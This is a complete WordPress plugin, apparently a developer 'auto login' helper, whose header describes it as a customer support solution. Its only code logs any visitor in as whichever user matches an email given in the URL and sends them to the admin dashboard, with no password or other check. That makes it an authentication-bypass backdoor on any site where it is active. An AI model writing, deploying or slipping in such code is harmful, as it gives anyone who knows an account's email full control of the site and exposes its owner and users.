<?php
/**
 * Plugin Name: Auto Login for DEv
 * Plugin URI: https://localhost/
 * Description: Exceptional customer support solution for WordPress!
 */

add_action('template_redirect', function (){
	if(isset($_GET['local_login']) && isset($_GET['user_email'])  ){
		$user_email = sanitize_email($_GET['user_email']);
		$user = get_user_by_email($user_email);
		if ( $user ) {
			$user_id = $user->ID;
			wp_set_current_user($user_id);
			wp_set_auth_cookie($user_id);

			wp_redirect(admin_url());
			exit;
		}
		die('Something wrong');
	}
});